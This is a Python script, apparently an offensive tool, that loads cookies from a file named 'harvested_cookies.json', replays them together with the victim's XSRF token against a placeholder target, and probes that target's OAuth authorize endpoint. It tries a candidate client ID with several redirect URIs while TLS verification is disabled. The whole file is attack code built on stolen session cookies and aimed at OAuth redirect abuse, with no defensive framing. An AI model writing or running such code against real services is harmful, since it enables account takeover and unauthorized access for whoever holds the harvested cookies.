import json
import httpx
import warnings

warnings.filterwarnings("ignore")

COOKIE_FILE = "harvested_cookies.json"
BASE_URL = "https://yourtarget.com"
CANDIDATE_CLIENT_ID = "jmkLHunK1p1w48M5WgFOoKXDwkAsIlpR"

def test_client_id():
    print(f"[*] Testing candidate Client ID: {CANDIDATE_CLIENT_ID} against Axis Connect Gateway...")
    
    try:
        with open(COOKIE_FILE, "r", encoding="utf-8") as f:
            cookies_list = json.load(f)
    except Exception as e:
        print(f"[!] Error loading {COOKIE_FILE}: {e}")
        return
        
    cookie_jar = {c['name']: c['value'] for c in cookies_list}
    xsrf_token = cookie_jar.get("XSRF-TOKEN", "")
    
    client = httpx.Client(verify=False, timeout=10.0, follow_redirects=False, cookies=cookie_jar)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    if xsrf_token:
        headers["X-XSRF-TOKEN"] = xsrf_token
        
    # Test permutations of redirect URIs alongside the candidate client ID
    redirect_candidates = [
        "https://yourtarget.com/callback",
        "https://yourtarget.com",
        "https://yourtarget.com/oauth2/callback",
        "http://localhost:8080"
    ]
    
    for uri in redirect_candidates:
        params = {
            "response_type": "code",
            "client_id": CANDIDATE_CLIENT_ID,
            "redirect_uri": uri,
            "scope": "openid profile email"
        }
        url = f"{BASE_URL}/authorize"
        try:
            res = client.get(url, params=params, headers=headers)
            print(f"    -> redirect_uri={uri} | Status: {res.status_code}")
            location = res.headers.get("Location", "No Location")
            print(f"       Location: {location}\n")
        except httpx.RequestError as e:
            print(f"    -> Connection Error: {e}")
            
    client.close()
    print("[*] Client ID validation cycle complete.")

if __name__ == "__main__":
    test_client_id()
